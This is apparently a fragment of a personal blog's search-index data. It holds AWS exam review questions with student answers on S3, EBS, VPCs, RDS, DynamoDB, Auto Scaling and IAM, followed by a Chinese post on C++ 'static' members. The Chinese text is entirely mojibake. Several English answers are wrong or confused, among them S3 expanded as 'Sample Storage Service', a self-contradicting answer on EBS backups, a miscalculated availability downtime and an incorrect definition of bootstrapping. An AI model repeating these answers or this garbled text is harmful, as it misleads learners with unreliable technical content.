Files are distributed in different physical nodes.(from Google) This means that you must write whole objects at a time. If you change one small part of a file, you must rewrite the entire file in order to commit the change to Amazon S3.(U2page77) True or false: S3 is a Block Storage system. False. S3 is cloud object storage for the Internet where files are reachable via a restful URL.\nTrue or false: EBS is an Object Storage system. False. EBS provides block-level storage volumes for use with Amazon EC2 instances.\nTrue or false: S3 is a key-value object store with unlimited storage capacity. Explain your answer. True False: An object is composed of a file and any metadata that describes that file. S3 can store an unlimited number of objects in a bucket. There is a 100-bucket limit per account and the size of an object can be up to 5 TB, and there is no limit to the size of a bucket.\nWhat is the largest size object that can be stored in S3? 5TB\nEBS can be compared to what real hardware device? Hard disk(Hard drive)\nFor what type of workload would you prefer S3? One very common use for Amazon S3 is storage and distribution of static web content and media Q: The data need to be accessed by internet.\nTrue or False: You can back up EBS to S3. Explain your answer. False, we only can backup EBS snapshot to S3\nWhat is an EBS Snapshot? An EBS snapshot is a point-in-time backup of your EBS volume. It is a â€œcopyâ€ of the data on your EBS volume. Snapshots are incremental backups, which means that only the blocks on the device that have changed after your most recent snapshot are saved\nDescribe the EBS volume lifecycle.\nWhat are provisioned IOPS? Provisioned IOPS are a new EBS volume type designed to deliver predictable, high performance for I/O intensive workloads, such as database applications, that rely on consistent and fast response times\nDescribe three use cases for EBS. OS: use for root/boot volume, secondary volume Databases: scales with your performance needs Applications: install and persist any application\nDescribe the difference between Amazon S3 Standard and Amazon S3 Standard - Infrequent Access.\nAmazon S3 Standard, for general-purpose storage of frequently accessed data Amazon S3 Standard-Infrequent Access (Standard-IA), for long-lived, but less frequently accessed data Data retrieval from Amazon Glacier will take _____ to begin:\n10 minutes 1 hour 3-5 hours 1-3 hours What does it mean to be fault tolerant? Fault-tolerance defines the ability for a system to remain in operation even if some of the components used to build the system fail.\nWhat does it mean to be highly available? High availability refers to systems that are durable and likely to operate continuously without failure for a long time.\nWhat is the difference between availability and durability of data?\nDurability means data integrity, data is not lost etc. Availability means that it is \u0026ldquo;available to access\u0026rdquo; Data can be unavailable to access but the data will still be intact and not lost if there is high durability. Suppose that the probability that a storage device fails in a year is 1%. Suppose that you store your data redundantly on two independent devices with the same failure rate. What is the probability that you will lose your data in a year? Assuming no use of error correcting codes, on how many devices do you have to redundantly store your data so that the probability of losing it is less than .0000000001%? 0.01%, 6\nHow much time will an application be unavailable in a year if it has 99.999999999% availability? 0.000315s 0.019\nAWS Networking\nTrue or False: VPCs are logically isolated from other virtual networks. True\nA VPC resides in a single:\nAvailability Zone Edge Location Region What is a data center? An Availability Zone? A Region? Give two examples of AWS regions.\nData center: A data center is a facility used to house computer systems and associated components, such as telecommunications and storage systems. Availability Zone: AZs consist of data centers clustered in a region. Region: Geographic locations that contain multiple Availability Zones. Two examples: US East: N. Virginia, Ohio; US West: N. California, Oregon; China: Beijing How do Availability Zones in the same Region differ? Availability Zones are always referenced by their Code Name, which is defined by the AZs Region Code Name that the AZ belongs to, followed by a letter.\nWhat is an Edge location? An edge location is where end users access services located on AWS platform.\nTrue or False: There are many more Regions than Edge locations in AWS. Explain your answer. False: 74+ edge locations while 16 regions\nTrue or False: Data transferred between AZs travel on private high-speed network links. True: Each AZ is isolated, but the AZs in a region are connected through low-latency links.\nTrue or False: Data transferred between Regions travel on the public Internet. True\nTrue or False: VPCs cannot include resources in more than one Availability Zone. False: each subnet must reside entirely within one AZ\nTrue or False: VPC provides various feature to provide security, including Security Groups, Network Access Control Lists, and Key Pairs. True\nWhich of the following statements regarding Amazon VPC are True? 1,2,4\nA private subnet should be used for resources that wonâ€™t be accessible over the Internet Each subnet must reside entirely within one Availability Zone A public subnet should be used for resources that wonâ€™t be accessible over the Internet A subnet defines a range of IP addresses in your VPC Subnets can span Availability Zones Each Availability Zone in an AWS Region is separated by:\nAt least 10s of miles At most 10s of miles Exactly 10 miles At least 100 miles Regions consist of at least __ Availability Zones:\n1 6 2 10 True or False: A Security Group is within a single VPC. True\nGive an example of a network rule you might assign in a Security Group. HTTP(80), HTTPS(443)\nSecurity Groups control both inbound and outbound traffic at the _____ level.\nSubnet VPC Instance Availability Zone AWS Database\nDescribe three differences between an AWS managed service and an unmanaged service.\nManaged service offers support for every problem or task, emergency or routine versus unmanaged services offer no routine support. Managed service is more expensive as there is constant management versus unmanaged services are cheaper as you are responsible for everything. Managed hosting is far less work and requires little expertise. If something goes wrong and you\u0026rsquo;re stuck, you can call on your host to give you a hand versus Unmanaged hosting gives you complete control: sole access and total freedom. __________ are the basic building blocks of Amazon RDS. DB instances\nTrue or False: A DB Instance is an isolated database environment in the cloud. True: A DB instance is an isolated database environment running in the cloud. It is the basic building block of Amazon RDS.\nName four databases supported by AWS RDS. MySQL, MariaDB, Microsoft SQL Server, Oracle, PostgreSQL\nDescribe three differences between using a managed RDS and building your own database on EC2. Managed RDS provide cost-efficient and resizable capacity while managing time-consuming database administration task. RDS automatically patches the database software and backs up the database. Itâ€™s flexible. It accesses to the full capabilities of databases.\nIn general, SQL databases have _____ scaling and NoSQL databases have _____ scaling. vertical horizontal\nDescribe the difference between vertical scaling and horizontal scaling. Horizontal scaling means that you scale by adding more machines into your pool of resources whereas vertical scaling means that you scale by adding more power (CPU, RAM) to an existing machine.\nWhat is the main limitation to vertical scaling? That is, when can you no longer scale vertically? In Scaling Up (also known as Vertical Scaling) the limitation is hardware related in a very specific way: how much memory, disk, and processor a single server can supportâ€¦ Vertical scaling is limited to the capacity of a single machine.\nWhat is the main limitation to horizontal scaling? That is, when can you no longer scale horizontally? In theory, horizontal scalability is only limited by how many entities can be connected successfully.\nGive three examples of SQL-like statements.\nCREATE TABLE table_name (column_name column_type); Select * FROM table_name; INSERT INTO table_name (field1, field2,...) VALUES (value1, value2,...); Give an example of datasqu that might be in a NoSQL database. True or False: You cannot use SQL to query a NoSQL database. Explain your answer. False\nTrue or False: You can query and scan DynamoDB to retrieve data. True\nFor what type of workload would you prefer DynamoDB? New web-scale applications and larger number of small read and write\nTrue/False: You should utilize Amazon DynamoDB if your application requires complex queries, joins, and updates. False\nTrue or False: You should utilize Amazon DynamoDB if your data is unstructured and you require fast I/O. True\nWhich of the following allows unlimited storage:\nS3 EBS Instance Store RDS DynamoDB Describe eventually consistent reads and strongly consistent reads. Which AWS service(s) provide eventually consistent reads, and under what conditions? (Move to exam 2) service(s) provide eventually consistent reads, and under what conditions?\nEventually Consistent Reads: When you read data from a DynamoDB table, the response might not reflect the results of a recently completed write operation. The response might include some stale data. If you repeat your read request after a short time, the response should return the latest data. Strongly Consistent Reads: When you request a strongly consistent read, DynamoDB returns a response with the most up-to-date data, reflecting the updates from all prior write operations that were successful. A strongly consistent read might not be available if there is a network delay or outage. By default (DynamoDB) Why would we not always use strongly consistent reads in a distributed system like AWS? A strongly consistent read might not be available if there is a network delay or outage.\nDescribe the similarity and difference between Secondary DB and Read Replica DB\nAWS Scalability\nName the two types of load balancers. Classic load balancer, Application load balancer, Network load balancer.\nYou can create Auto Scaling Group scaling policies that utilize _____ to determine when your Auto Scaling group should scale out or scale in. 1. VPC 2. S3 3. CloudWatch alarms 4. Instance Store\nList three things that you can specify when you create a Launch Configuration.\nA key pair Security group A block device mapping The ID of the Amazon Machine Image (AMI), the instance type, a key pair, one or more security groups, and a block device mapping List three benefits of utilizing Auto Scaling within your application.\nBetter fault tolerance Better availability Better cost management True or False: An Auto Scaling group is a collection of EC2 Instances that share the same characteristics. True: An Auto Scaling group contains a collection of EC2 instances that share similar characteristics and are treated as a logical grouping for the purposes of instance scaling and management.\nExplain the concept of bootstrapping an instance. It creates an application context that provides the runtime context for an application.\nAWS Security\nWhat does â€œSecurity of the Cloudâ€ mean? Describe three aspects of security of the cloud. The policies and mechanisms AWS use to protect the cloud itself. Compute, storage, database, networking.\nWhat does â€œSecurity in the Cloudâ€ mean? Describe three aspects of security in the cloud. The AWS service you utilize to run your workloads. Operating system, customer application and content, IAM\nDefine authentication. Define authorization. How are they different?\nAuthentication is the process of verifying who you are. When you log on to a PC with a username and password you are authenticating. Authorization is the process of verifying that you have access to something. Gaining access to a resource (e.g. directory on a hard disk) because the permissions configured on it allow you access is authorization. List the three IAM constructs that an IAM Policy can be assigned to. IAM users, IAM groups, IAM role.\nExplain what an IAM User is. An IAM user is an entity that you create in AWS to represent the person or service that uses it to interact with AWS.\nExplain a difference between role-based authorization and user-based authorization. Roles-based authorization is used to group users into groups (roles) and then set permissions on the role rather than on individual users.\nTrue/False: All IAM permissions in AWS are implicitly allowed by default. False\nDraw the IAM permissions flow chart.\nSuppose you create a policy for a user to Allow access to a table called â€œTable1â€. In your same policy you Deny access to any table that is Not â€œTable1â€. Then in the same policy you Allow access to â€œTable2â€. Can this user access â€œTable2â€? Why or why not? Answer: The user can\u0026rsquo;t access table 2 because we can\u0026rsquo;t rewrite or overwrite the previlieges already defined. If the user needs to access it he needs to define it before its access is set as deny\nIAM Policies are written in _____.\nJSON CSV XML True or False: IAM is appropriate for OS and application authentication. False\n","date":1537715371,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1537715371,"objectID":"2d345e35bfed3c8da203bf890cda5a0b","permalink":"http://www.guozet.me/post/CPSC6440-CloudComputing-basic-concepts/","publishdate":"2018-09-23T15:09:31Z","relpermalink":"/post/CPSC6440-CloudComputing-basic-concepts/","section":"post","summary":"Exam 1 Review Questions. Exam 1 will be derived from these questions.\næ³¨æ˜ï¼šåŠ ç²—çš„é—®é¢˜æ˜¯è€ƒè¯•çš„é‡ç‚¹è€ƒè¯•é¢˜ç›®\nAcronyms Expand each of the following acronyms of the following in the context of this class:\nAWS: Amazon Web Services AZ: Availablity Zone EC2: Elastic Compute Cloud S3: Sample Storage Service EBS: Elastic Block Store RDS: Relation Database Service NoSQL: No-relation SQL ELB: Elastic Load Balancing PAAS: Platform as a service HAAS: Hardware as a service IAAS: Infrastructure as a service SAAS: Software as a service CIDR: Classless inter-domain routing REST: Representational State Transfer SOAP: Simple Object Access Protocol VPC: Virtual Private Cloud CTO: Chief Technology Officer CIO: Chief Information Officer AMI: Amazon Machine Image IAM: Identity and Access Management MFA: Multi-factor Authentication IOPS: I/O Operations per second ACL: Access Control List CLI: Command Line Interface SDK: Software Development Kit API: Application Interface JSON: JavaScript Object Notation ","tags":"Cloud computing","title":"Cloud computing Basic concepts","type":"post"},{"authors":null,"categories":"C++","content":"C++ä¸­Staticå…³é”®å­—çš„åº”ç”¨ ç”±äºC++æ˜¯ä¸€ç§æºè‡ªäºCçš„è¯­è¨€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆåˆ†æStaticåœ¨Cè¯­è¨€ä¸­çš„åº”ç”¨ã€‚åœ¨Cè¯­è¨€ä¸­, ä½¿ç”¨Staticå…³é”®å­—çš„ä½œç”¨æ˜¯:\nç”¨äºå‡½æ•°å†…éƒ¨ä¿®é¥°å˜é‡ï¼Œå³å‡½æ•°å†…çš„é™æ€å˜é‡ã€‚è¿™ç§å˜é‡çš„ç”Ÿå­˜æœŸé•¿äºè¯¥å‡½æ•°ï¼Œä½¿å¾—å‡½æ•°å…·æœ‰ä¸€å®šçš„â€œçŠ¶æ€â€ã€‚ä½¿ç”¨é™æ€å˜é‡çš„å‡½æ•°ä¸€èˆ¬æ˜¯ä¸å¯é‡å…¥çš„ï¼Œä¹Ÿä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œæ¯”å¦‚strtok(3)ã€‚\nç”¨åœ¨æ–‡ä»¶çº§åˆ«ï¼ˆå‡½æ•°ä½“ä¹‹å¤–ï¼‰ï¼Œä¿®é¥°å˜é‡æˆ–å‡½æ•°ï¼Œè¡¨ç¤ºè¯¥å˜é‡æˆ–å‡½æ•°åªåœ¨æœ¬æ–‡ä»¶å¯è§ï¼Œå…¶ä»–æ–‡ä»¶çœ‹ä¸åˆ°ä¹Ÿè®¿é—®ä¸åˆ°è¯¥å˜é‡æˆ–å‡½æ•°ã€‚ä¸“ä¸šçš„è¯´æ³•å«â€œå…·æœ‰internal linkageâ€ï¼ˆç®€è¨€ä¹‹ï¼šä¸æš´éœ²ç»™åˆ«çš„translation unitï¼‰ã€‚\nåœ¨C++ä¸­å¼•å‡ºçš„Cè¯­è¨€æ²¡æœ‰çš„ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦åˆ†æåœ¨C++çš„ç±»é‡Œé¢ä½¿ç”¨Staticå…³é”®å­—çš„ä½œç”¨ä¸æ–¹å¼ã€‚\nç”¨äºä¿®é¥°ç±»çš„æ•°æ®æˆå‘˜ï¼Œå³æ‰€è°“â€œé™æ€æˆå‘˜â€ã€‚è¿™ç§æ•°æ®æˆå‘˜çš„ç”Ÿå­˜æœŸå¤§äºclassçš„å¯¹è±¡ï¼ˆå®ä¾‹/instanceï¼‰ã€‚é™æ€æ•°æ®æˆå‘˜æ˜¯æ¯ä¸ªclassæœ‰ä¸€ä»½ï¼Œæ™®é€šæ•°æ®æˆå‘˜æ˜¯æ¯ä¸ªinstance æœ‰ä¸€ä»½ã€‚\nç”¨äºä¿®é¥°classçš„æˆå‘˜å‡½æ•°ï¼Œå³æ‰€è°“â€œé™æ€æˆå‘˜å‡½æ•°â€ã€‚è¿™ç§æˆå‘˜å‡½æ•°åªèƒ½è®¿é—®é™æ€æˆå‘˜å’Œå…¶ä»–é™æ€ç¨‹å‘˜å‡½æ•°ï¼Œä¸èƒ½è®¿é—®éé™æ€æˆå‘˜å’Œéé™æ€æˆå‘˜å‡½æ•°ã€‚\nC++ ç±»ä¸­çš„staticæ•°æ®æˆå‘˜çš„åˆå§‹åŒ–å’Œç‰¹ç‚¹ class CTypeInit{\rpublic:\rCTypeInit( int c):m_c(c),m_ra(c){ }\rprivate:\rint m_a;\t//é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨åˆå§‹åŒ–ï¼Œæˆ–è€…æ„é€ å‡½æ•°åˆå§‹åŒ–\r/*å¼•ç”¨*/\rint \u0026amp;m_ra;\t//åªèƒ½é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨åˆå§‹åŒ–\r/*é™æ€å˜é‡*/\rstatic int m_b;\t/*å¸¸é‡*/\rconst int m_c;\t/*é™æ€æ•´å‹å¸¸é‡*/\rstatic const int m_d;\t/*é™æ€éæ•´å‹å¸¸é‡*/\rstatic const double m_e;\r};\r//é™æ€æˆå‘˜å˜é‡ï¼Œå¿…é¡»åœ¨ç±»å¤–åˆå§‹åŒ–,ä¸”è¦å»æ‰staticå…³é”®å­—\rint CTypeInit::m_b = 6;\rconst int CTypeInit::m_d = 6;\rconst double CTypeInit::m_e = 3.1415926;\rint main()\r{\rCTypeInit obT(2);\rreturn 0;\r}\råˆ†ä¸ºä¸‹é¢å‡ ç§æƒ…å†µ\né™æ€å˜é‡ static int m_b;\nstaticæˆå‘˜å˜é‡éœ€è¦åœ¨ç±»å®šä¹‰ä½“å¤–è¿›è¡Œåˆå§‹åŒ–ä¸å®šä¹‰ï¼Œå› ä¸ºstaticæ•°æ®æˆå‘˜ç‹¬ç«‹è¯¥ç±»çš„ä»»æ„å¯¹è±¡å­˜åœ¨ï¼Œå®ƒæ˜¯ä¸ç±»å…³è”çš„å¯¹è±¡ï¼Œä¸ä¸ç±»å¯¹è±¡å…³è”ã€‚ä¾‹å¦‚ï¼šä¸Šè¿°ç¨‹åºä¸­çš„cå˜é‡çš„åˆå§‹åŒ–ã€‚\nåªèƒ½åœ¨ç±»å¤–åˆå§‹åŒ– ä¸èƒ½é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨åˆå§‹åŒ–ï¼Œ ä¸èƒ½åœ¨ç±»å†…è¿›è¡Œåˆå§‹åŒ–ï¼Œ ä¸èƒ½åœ¨æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–ï¼Œ å¸¸é‡ const int m_c;\nåªèƒ½é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨åˆå§‹åŒ– ä¸èƒ½åœ¨ç±»å†…è¿›è¡Œåˆå§‹åŒ– ä¸èƒ½åœ¨æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ– ä¸èƒ½åœ¨ç±»å¤–åˆå§‹åŒ– å¼•ç”¨å˜é‡ int \u0026amp;m_ra;\nåªèƒ½é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨åˆå§‹åŒ–ä¸”å¿…é¡»ç”¨å˜é‡åˆå§‹åŒ–ï¼Œä¸èƒ½åœ¨ç±»çš„å®šä¹‰å¤–ï¼ˆå†…ï¼‰åˆå§‹åŒ–ï¼Œä¸èƒ½é€šè¿‡æ„é€ å‡½æ•°åˆå§‹åŒ–ã€‚\né™æ€æ•´å‹å¸¸é‡ static const int m_d;\nï¼ˆæ•´å‹ï¼‰èƒ½å¦åœ¨ç±»ä¸­åˆå§‹åŒ–ï¼Œå–å†³äºç¼–è¯‘å™¨ èƒ½åœ¨åœ¨ç±»å¤–åˆå§‹åŒ–ï¼Œä¸èƒ½å¸¦static é™æ€éæ•´å‹å¸¸é‡ static const double m_e;\n(doubleå‹ï¼‰èƒ½å¦åœ¨ç±»ä¸­åˆå§‹åŒ–ï¼Œå–å†³äºç¼–è¯‘å™¨ èƒ½åœ¨åœ¨ç±»å¤–åˆå§‹åŒ–ï¼Œä¸èƒ½å¸¦static é™æ€æ•´å‹å¸¸é‡å’Œé™æ€éæ•´å½¢å¸¸é‡åœ¨ç±»å®šä¹‰å†…éƒ¨åˆå§‹åŒ–æ—¶ï¼Œåœ¨VC6.0ä¸­éƒ½ä¸èƒ½ç¼–è¯‘é€šè¿‡ï¼Œè€Œåœ¨GCCä¸­éƒ½å¯ä»¥ç¼–è¯‘é€šè¿‡ï¼Œåœ¨ä¸åŒç¼–è¯‘å™¨ä¸‹æœ‰ä¸åŒçš„ç»“æœï¼Œä½†å‰ä¸‰ä¸ªæ˜¯ç¡®å®šçš„ã€‚å½“ç„¶ï¼Œå¦‚æœä¸ä¹ æƒ¯ç±»å†…åˆå§‹åŒ–ï¼Œå¯ä»¥å°†é™æ€å¸¸é‡å’Œé™æ€å˜é‡çš„åˆå§‹åŒ–ç»Ÿä¸€èµ·æ¥ï¼Œå°†é™æ€å¸¸é‡å’Œé™æ€å˜é‡çš„åˆå§‹åŒ–å…¨éƒ¨éƒ½ç§»åŠ¨ç±»å®šä¹‰ä¹‹å¤–åˆå§‹åŒ–ï¼ˆæ¨èä½¿ç”¨è¿™ç§æ–¹å¼ï¼‰ã€‚å¦å¤–ï¼Œå¦‚æœç¼–è¯‘å™¨ä¸æ”¯æŒç±»å†…åˆå§‹åŒ–ï¼Œè€Œæ­¤æ—¶ç±»åœ¨ç¼–è¯‘æœŸåˆæ°æ°éœ€è¦å®šä¹‰çš„æˆå‘˜å¸¸é‡çš„å€¼ï¼Œèº«å‡ºå¦‚æ­¤å·¦å³ä¸ºéš¾çš„å¢ƒåœ°ï¼Œæˆ‘ä»¬åº”è¯¥è€ƒè™‘ä½¿ç”¨enumï¼å› ä¸ºenumæœ¬è´¨ä¹Ÿæ˜¯ä¸€ä¸ªæ•´å‹å¸¸é‡ã€‚\nå°ç»“ ç±»çš„é™æ€æˆå‘˜å±äºç±»ä½œç”¨åŸŸï¼Œä½†ä¸å±äºç±»å¯¹è±¡ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸå’Œæ™®é€šçš„å…¨å±€é™æ€å˜é‡ä¸€æ ·ï¼Œç¨‹åºè¿è¡Œæ—¶è¿›è¡Œåˆ†é…å†…å­˜å’Œåˆå§‹åŒ–ï¼Œç¨‹åºç»“æŸæ—¶åˆ™è¢«é‡Šæ”¾ã€‚æ‰€ä»¥ä¸èƒ½åœ¨ç±»çš„æ„é€ å‡½æ•°ä¸­è¿›è¡Œåˆå§‹åŒ–ã€‚\nä¼˜ç‚¹\nstaticæˆå‘˜çš„åå­—æ˜¯åœ¨ç±»çš„ä½œç”¨åŸŸä¸­ï¼Œå› æ­¤å¯ä»¥é¿å…ä¸å…¶å®ƒç±»æˆå‘˜æˆ–å…¨å±€å¯¹è±¡åå­—å†²çªã€‚ å¯ä»¥å®æ–½å°è£…ï¼Œstaticæˆå‘˜å¯ä»¥æ˜¯ç§æœ‰çš„ï¼Œè€Œå…¨å±€å¯¹è±¡ä¸å¯ä»¥ã€‚ é˜…è¯»ç¨‹åºå®¹æ˜“çœ‹å‡ºstaticæˆå‘˜ä¸æŸä¸ªç±»ç›¸å…³è”ï¼Œè¿™ç§å¯è§æ€§å¯ä»¥æ¸…æ™°åœ°åæ˜ ç¨‹åºå‘˜çš„æ„å›¾ã€‚ C++ ç±»é‡Œé¢çš„Staticæˆå‘˜å‡½æ•° #include \u0026lt;iostream\u0026gt;\rusing namespace std;\rclass test2\r{\rpublic:\rtest2(int num) : y(num){}\r~test2(){}\rstatic void testStaticFun()\r{\rcout \u0026lt;\u0026lt; \u0026quot;y = \u0026quot; \u0026lt;\u0026lt; y \u0026lt;\u0026lt; endl; //Error:é™æ€æˆå‘˜å‡½æ•°ä¸èƒ½è®¿é—®éé™æ€æˆå‘˜\r}\rvoid testFun()\r{\rcout \u0026lt;\u0026lt; \u0026quot;x = \u0026quot; \u0026lt;\u0026lt; x \u0026lt;\u0026lt; endl; }\rprivate:\rstatic int x;//é™æ€æˆå‘˜å˜é‡çš„å¼•ç”¨æ€§è¯´æ˜\rint y;\r};\rint test2::x = 10;//é™æ€æˆå‘˜å˜é‡çš„å®šä¹‰æ€§è¯´æ˜\rint main(void)\r{\rtest2 t(100);\rt.testFun();\rreturn 0;\r}\rå°ç»“ -æˆå‘˜å‡½æ•°ç‰¹ç‚¹ å› ä¸ºstaticæˆå‘˜å‡½æ•°æ²¡æœ‰thisæŒ‡é’ˆï¼Œæ‰€ä»¥é™æ€æˆå‘˜å‡½æ•°ä¸å¯ä»¥è®¿é—®éé™æ€æˆå‘˜ã€‚ éé™æ€æˆå‘˜å‡½æ•°å¯ä»¥è®¿é—®é™æ€æˆå‘˜ã€‚ é™æ€æ•°æ®æˆå‘˜ä¸ç±»çš„å¤§å°æ— å…³ï¼Œå› ä¸ºé™æ€æˆå‘˜åªæ˜¯ä½œç”¨åœ¨ç±»çš„èŒƒå›´è€Œå·²ã€‚ è¡¥å……ï¼šCè¯­è¨€ä¸­Staticå…³é”®å­— Cè¯­è¨€ç¨‹åºå¯ä»¥çœ‹æˆç”±ä¸€ç³»åˆ—å¤–éƒ¨å¯¹è±¡æ„æˆï¼Œè¿™äº›å¤–éƒ¨å¯¹è±¡å¯èƒ½æ˜¯å˜é‡æˆ–å‡½æ•°ã€‚è€Œå†…éƒ¨å˜é‡æ˜¯æŒ‡å®šä¹‰åœ¨å‡½æ•°å†…éƒ¨çš„å‡½æ•°å‚æ•°åŠå˜é‡ã€‚å¤–éƒ¨å˜é‡å®šä¹‰åœ¨å‡½æ•°ä¹‹å¤–ï¼Œå› æ­¤å¯ä»¥åœ¨è®¸å¤šå‡½æ•°ä¸­ä½¿ç”¨ã€‚ç”±äºCè¯­è¨€ä¸å…è®¸åœ¨ä¸€ä¸ªå‡½æ•°ä¸­å®šä¹‰å…¶å®ƒå‡½æ•°ï¼Œå› æ­¤å‡½æ•°æœ¬èº«åªèƒ½æ˜¯â€œå¤–éƒ¨çš„â€ã€‚\nç”±äºCè¯­è¨€ä»£ç æ˜¯ä»¥æ–‡ä»¶ä¸ºå•ä½æ¥ç»„ç»‡çš„ï¼Œåœ¨ä¸€ä¸ªæºç¨‹åºæ‰€æœ‰æºæ–‡ä»¶ä¸­ï¼Œä¸€ä¸ªå¤–éƒ¨å˜é‡æˆ–å‡½æ•°åªèƒ½åœ¨æŸä¸ªæ–‡ä»¶ä¸­å®šä¹‰ä¸€æ¬¡ï¼Œè€Œå…¶å®ƒæ–‡ä»¶å¯ä»¥é€šè¿‡externå£°æ˜æ¥è®¿é—®å®ƒï¼ˆå®šä¹‰å¤–éƒ¨å˜é‡æˆ–å‡½æ•°çš„æºæ–‡ä»¶ä¸­ä¹Ÿå¯ä»¥åŒ…å«å¯¹è¯¥å¤–éƒ¨å˜é‡çš„externå£°æ˜ï¼‰ã€‚\nè€Œstaticåˆ™å¯ä»¥é™å®šå˜é‡æˆ–å‡½æ•°ä¸ºé™æ€å­˜å‚¨ã€‚å¦‚æœç”¨staticé™å®šå¤–éƒ¨å˜é‡ä¸å‡½æ•°ï¼Œåˆ™å¯ä»¥å°†è¯¥å¯¹è±¡çš„ä½œç”¨åŸŸé™å®šä¸ºè¢«ç¼–è¯‘æºæ–‡ä»¶çš„å‰©ä½™éƒ¨åˆ†ã€‚é€šè¿‡staticé™å®šå¤–éƒ¨å¯¹è±¡ï¼Œå¯ä»¥è¾¾åˆ°éšè—å¤–éƒ¨å¯¹è±¡çš„ç›®çš„ã€‚å› è€Œï¼Œstaticé™å®šçš„å˜é‡æˆ–å‡½æ•°ä¸ä¼šå’ŒåŒä¸€ç¨‹åºä¸­å…¶å®ƒæ–‡ä»¶ä¸­åŒåçš„ç›¸å†²çªã€‚å¦‚æœç”¨staticé™å®šå†…éƒ¨å˜é‡ï¼Œåˆ™è¯¥å˜é‡ä»ç¨‹åºä¸€å¼€å§‹å°±æ‹¥æœ‰å†…å­˜ï¼Œä¸ä¼šéšå…¶æ‰€åœ¨å‡½æ•°çš„è°ƒç”¨å’Œé€€å‡ºè€Œåˆ†é…å’Œæ¶ˆå¤±ã€‚\nCè¯­è¨€ä¸­ä½¿ç”¨é™æ€å‡½æ•°çš„å¥½å¤„ é™æ€å‡½æ•°ä¼šè¢«è‡ªåŠ¨åˆ†é…åœ¨ä¸€ä¸ªä¸€ç›´ä½¿ç”¨çš„å­˜å‚¨åŒºï¼Œç›´åˆ°é€€å‡ºåº”ç”¨ç¨‹åºå®ä¾‹ï¼Œé¿å…äº†è°ƒç”¨å‡½æ•°æ—¶å‹æ ˆå‡ºæ ˆï¼Œé€Ÿåº¦å¿«å¾ˆå¤šã€‚\nå…³é”®å­—â€œstaticâ€ï¼Œè¯‘æˆä¸­æ–‡å°±æ˜¯â€œé™æ€çš„â€ï¼Œæ‰€ä»¥å†…éƒ¨å‡½æ•°åˆç§°é™æ€å‡½æ•°ã€‚ä½†æ­¤å¤„â€œstaticâ€çš„å«ä¹‰ä¸æ˜¯æŒ‡å­˜å‚¨æ–¹å¼ï¼Œè€Œæ˜¯æŒ‡å¯¹å‡½æ•°çš„ä½œç”¨åŸŸä»…å±€é™äºæœ¬æ–‡ä»¶ã€‚ ä½¿ç”¨å†…éƒ¨å‡½æ•°çš„å¥½å¤„æ˜¯ï¼šä¸åŒçš„äººç¼–å†™ä¸åŒçš„å‡½æ•°æ—¶ï¼Œä¸ç”¨æ‹…å¿ƒè‡ªå·±å®šä¹‰çš„å‡½æ•°ï¼Œæ˜¯å¦ä¼šä¸å…¶å®ƒæ–‡ä»¶ä¸­çš„å‡½æ•°åŒåï¼Œå› ä¸ºåŒåä¹Ÿæ²¡æœ‰å…³ç³»ã€‚\ncè¯­è¨€ä¸­staticçš„è¯­ä¹‰ 1.staticå˜é‡:\nå±€éƒ¨\né™æ€å±€éƒ¨å˜é‡åœ¨å‡½æ•°å†…å®šä¹‰,ç”Ÿå­˜æœŸä¸ºæ•´ä¸ªæºç¨‹åºï¼Œä½†ä½œç”¨åŸŸä¸è‡ªåŠ¨å˜é‡ç›¸åŒï¼Œåªèƒ½åœ¨å®šä¹‰è¯¥å˜é‡çš„å‡½æ•°å†…ä½¿ç”¨ã€‚é€€å‡ºè¯¥å‡½æ•°åï¼Œ å°½ç®¡è¯¥å˜é‡è¿˜ç»§ç»­å­˜åœ¨ï¼Œä½†ä¸èƒ½ä½¿ç”¨å®ƒã€‚ å¯¹åŸºæœ¬ç±»å‹çš„é™æ€å±€éƒ¨å˜é‡è‹¥åœ¨è¯´æ˜æ—¶æœªèµ‹ä»¥åˆå€¼ï¼Œåˆ™ç³»ç»Ÿè‡ªåŠ¨èµ‹äºˆ0å€¼ã€‚è€Œå¯¹è‡ªåŠ¨å˜é‡ä¸èµ‹åˆå€¼ï¼Œåˆ™å…¶å€¼æ˜¯ä¸å®šçš„ã€‚\nå…¨å±€\nå…¨å±€å˜é‡æœ¬èº«å°±æ˜¯é™æ€å­˜å‚¨æ–¹å¼ï¼Œ é™æ€å…¨å±€å˜é‡å½“ç„¶ä¹Ÿæ˜¯é™æ€å­˜å‚¨æ–¹å¼ã€‚ä½†æ˜¯ä»–ä»¬çš„ä½œç”¨åŸŸï¼Œéé™æ€å…¨å±€ å˜é‡çš„ä½œç”¨åŸŸæ˜¯æ•´ä¸ªæºç¨‹åºï¼ˆå¤šä¸ªæºæ–‡ä»¶å¯ä»¥å…±åŒä½¿ç”¨ï¼‰ï¼› è€Œé™æ€å…¨å±€å˜é‡åˆ™é™åˆ¶äº†å…¶ä½œç”¨åŸŸï¼Œ å³åªåœ¨å®šä¹‰è¯¥å˜é‡çš„æºæ–‡ä»¶å†…æœ‰æ•ˆï¼Œ åœ¨åŒä¸€æºç¨‹åºçš„å…¶å®ƒæºæ–‡ä»¶ä¸­ä¸èƒ½ä½¿ç”¨å®ƒã€‚\n2.staticå‡½æ•°ï¼ˆä¹Ÿå«å†…éƒ¨å‡½æ•°ï¼‰\nåªèƒ½è¢«æœ¬æ–‡ä»¶ä¸­çš„å‡½æ•°è°ƒç”¨ï¼Œè€Œä¸èƒ½è¢«åŒä¸€ç¨‹åºå…¶å®ƒæ–‡ä»¶ä¸­çš„å‡½æ•°è°ƒç”¨ã€‚åŒºåˆ«äºä¸€èˆ¬çš„éé™æ€å‡½æ•°ï¼ˆå¤–éƒ¨å‡½æ•°ï¼‰ 